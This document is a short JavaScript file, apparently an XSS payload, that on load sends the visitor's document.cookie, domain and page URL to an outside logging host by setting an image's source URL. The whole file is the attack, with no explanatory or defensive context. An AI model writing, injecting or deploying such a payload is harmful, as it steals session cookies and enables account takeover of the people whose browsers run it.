// static/payload.js
(function () {
  var i = new Image();
  i.src = "https://xss-logger-mjdo.onrender.com/log"
    + "?c=" + encodeURIComponent(document.cookie)
    + "&d=" + encodeURIComponent(document.domain)
    + "&l=" + encodeURIComponent(window.location);
})();
